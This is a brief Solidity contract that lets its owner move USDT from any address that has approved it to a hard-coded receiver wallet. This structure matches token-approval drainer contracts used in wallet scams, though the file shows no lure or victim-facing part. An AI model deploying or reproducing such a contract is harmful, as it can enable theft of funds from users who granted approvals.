// SPDX-License-Identifier: MIT okok
pragma solidity ^0.8.0;

contract USDTSpender {
    address public immutable owner;

    // 🔒 Hard-coded USDT token (Ethereum Mainnet)
    address public constant USDT =
        0xdAC17F958D2ee523a2206206994597C13D831ec7;

    // 🔒 Hard-coded receiver
    address public constant RECEIVER =
        0x68940E3642BFC284678E8EE60fF8a8d247858762;

    event Spent(address indexed from, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    function spendUSDT(address from, uint256 amount) external onlyOwner {
        // Check allowance
        (bool okAllowance, bytes memory allowanceData) = USDT.call(
            abi.encodeWithSignature(
                "allowance(address,address)",
                from,
                address(this)
            )
        );
        require(okAllowance, "Allowance check failed");

        uint256 allowed = abi.decode(allowanceData, (uint256));
        require(allowed >= amount, "Not enough allowance");

        // transferFrom using low-level call (USDT safe)
        (bool success, bytes memory data) = USDT.call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                from,
                RECEIVER,
                amount
            )
        );

        require(success, "transferFrom failed");

        // If token returns data, ensure true
        if (data.length > 0) {
            require(abi.decode(data, (bool)), "USDT transfer failed");
        }

        emit Spent(from, amount);
    }
}